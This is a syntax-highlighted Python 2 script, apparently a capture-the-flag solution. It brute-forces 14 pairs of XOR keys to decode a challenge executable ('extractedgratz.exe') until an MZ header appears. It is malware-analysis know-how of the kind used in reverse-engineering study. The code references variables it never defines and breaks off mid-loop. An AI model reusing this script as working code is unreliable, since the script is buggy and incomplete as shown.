</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">145
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">146
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>key1<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key1[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;oh happy dayz&#39;</span>
</span></span><span style=display:flex><span>key1[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;the final countdown&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key2<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key2[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;UNACCEPTABLE!&#39;</span>
</span></span><span style=display:flex><span>key2[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;omglob&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key3<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key3[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;you</span><span style=color:#cb4b16>\x27</span><span style=color:#2aa198>re so good&#39;</span>
</span></span><span style=display:flex><span>key3[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;you</span><span style=color:#cb4b16>\x27</span><span style=color:#2aa198>re so bad&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key4<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key4[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x66</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>key4[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x01</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key5<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key5[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;Sandboxes are fun to play in&#39;</span>
</span></span><span style=display:flex><span>key5[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;I</span><span style=color:#cb4b16>\x27</span><span style=color:#2aa198>m gonna sandbox your face&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key6<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key6[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;I can haz decode?&#39;</span>
</span></span><span style=display:flex><span>key6[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;Such fire. Much burn. Wow.&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key7<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key7[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x09\x00\x00\x01</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>key7[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;Feel the sting of the Monarch!&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key8<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key8[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;! 50 1337&#39;</span>
</span></span><span style=display:flex><span>key8[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;1337&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key9<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key9[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;LETS GO SHOPPING&#39;</span>
</span></span><span style=display:flex><span>key9[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;MATH IS HARD&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key10<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key10[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;LETS GO MATH&#39;</span>
</span></span><span style=display:flex><span>key10[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;SHOPPING IS HARD&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key11<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key11[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>key11[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x07\x77</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key12<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key12[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;backdoge.exe&#34;</span>
</span></span><span style=display:flex><span>key12[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;</span><span style=color:#cb4b16>\x00</span><span style=color:#2aa198>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key13<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key13[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;192.203.230.10&#39;</span>
</span></span><span style=display:flex><span>key13[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x00</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key14<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span>key14[<span style=color:#2aa198>0</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;</span><span style=color:#cb4b16>\x00</span><span style=color:#2aa198>&#39;</span>
</span></span><span style=display:flex><span>key14[<span style=color:#2aa198>1</span>]<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;jackRAT&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>index<span style=color:#719e07>=</span>{}
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> i <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>15</span>):
</span></span><span style=display:flex><span>    index[i] <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># we want this to support variable length keys</span>
</span></span><span style=display:flex><span><span style=color:#586e75># so if the key is smaller than data, it will wrap around</span>
</span></span><span style=display:flex><span><span style=color:#719e07>def</span> <span style=color:#268bd2>xor</span>(mydata,mykey):
</span></span><span style=display:flex><span>    keylen <span style=color:#719e07>=</span> <span style=color:#b58900>len</span>(mykey)
</span></span><span style=display:flex><span>    datalen <span style=color:#719e07>=</span> <span style=color:#b58900>len</span>(mydata)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#586e75># easier to just extend the key array, but probably not that memory efficient</span>
</span></span><span style=display:flex><span>    <span style=color:#586e75># not that we care about it here ;)</span>
</span></span><span style=display:flex><span>    key <span style=color:#719e07>=</span> mykey <span style=color:#719e07>*</span> ( (datalen<span style=color:#719e07>/</span>keylen)<span style=color:#719e07>+</span><span style=color:#2aa198>1</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#719e07>return</span> <span style=color:#2aa198>&#39;&#39;</span><span style=color:#719e07>.</span>join(<span style=color:#b58900>chr</span>(<span style=color:#b58900>ord</span>(a) <span style=color:#719e07>^</span> <span style=color:#b58900>ord</span>(b)) <span style=color:#719e07>for</span> a,b <span style=color:#719e07>in</span> <span style=color:#b58900>zip</span>(mydata,key))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>from</span> binascii <span style=color:#719e07>import</span> hexlify, unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>myfile <span style=color:#719e07>=</span> file(<span style=color:#2aa198>&#39;c:</span><span style=color:#cb4b16>\\</span><span style=color:#2aa198>extractedgratz.exe&#39;</span>,<span style=color:#2aa198>&#39;rb&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wholefile <span style=color:#719e07>=</span> myfile<span style=color:#719e07>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>out <span style=color:#719e07>=</span> wholefile[:<span style=color:#2aa198>0x10</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>myfile<span style=color:#719e07>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>counter <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> index[<span style=color:#2aa198>1</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> index[<span style=color:#2aa198>2</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>    <span style=color:#719e07>for</span> index[<span style=color:#2aa198>3</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>      <span style=color:#719e07>for</span> index[<span style=color:#2aa198>4</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>        <span style=color:#719e07>for</span> index[<span style=color:#2aa198>5</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>          <span style=color:#719e07>for</span> index[<span style=color:#2aa198>6</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>            <span style=color:#719e07>for</span> index[<span style=color:#2aa198>7</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>              <span style=color:#719e07>for</span> index[<span style=color:#2aa198>8</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                <span style=color:#719e07>for</span> index[<span style=color:#2aa198>9</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                  <span style=color:#719e07>for</span> index[<span style=color:#2aa198>10</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                    <span style=color:#719e07>for</span> index[<span style=color:#2aa198>11</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                      <span style=color:#719e07>for</span> index[<span style=color:#2aa198>12</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                        <span style=color:#719e07>for</span> index[<span style=color:#2aa198>13</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                          <span style=color:#719e07>for</span> index[<span style=color:#2aa198>14</span>] <span style=color:#719e07>in</span> xrange(<span style=color:#2aa198>2</span>):
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key1[index[<span style=color:#2aa198>1</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key2[index[<span style=color:#2aa198>2</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key3[index[<span style=color:#2aa198>3</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key4[index[<span style=color:#2aa198>4</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key5[index[<span style=color:#2aa198>5</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key6[index[<span style=color:#2aa198>6</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key7[index[<span style=color:#2aa198>7</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key8[index[<span style=color:#2aa198>8</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key9[index[<span style=color:#2aa198>9</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key10[index[<span style=color:#2aa198>10</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key11[index[<span style=color:#2aa198>11</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key12[index[<span style=color:#2aa198>12</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key13[index[<span style=color:#2aa198>13</span>]])
</span></span><span style=display:flex><span>                            out <span style=color:#719e07>=</span> xor(out,key14[index[<span style=color:#2aa198>14</span>]])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                            <span style=color:#719e07>if</span> ( out[<span style=color:#2aa198>0</span>]<span style=color:#719e07>==</span><span style=color:#2aa198>&#39;M&#39;</span> <span style=color:#719e07>and</span> out[<span style=color:#2aa198>1</span>]<span style=color:#719e07>==</span><span style=color:#2aa198>&#39;Z&#39;</span>):
</span></span><span style=display:flex><span>                              <span style=color:#b58900>print</span> <span style=color:#2aa198>&#34;Found it&#34;</span>
</span></span><span style=display:flex><span>                              <span style=color:#b58900>print</span> out
</span></span><span style=display:flex><span>                              <span style=color:#b58900>print</span> hexlify(out)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> wholefile
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key1[ind1])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key2[ind2])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key3[ind3])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key4[ind4])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key5[ind5])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key6[ind6])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key7[ind7])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key8[ind8])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key9[ind9])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key10[ind10])
</span></span><span style=display:flex><span>                              out <span style=color:#719e07>=</span> xor(out,key11[ind11])
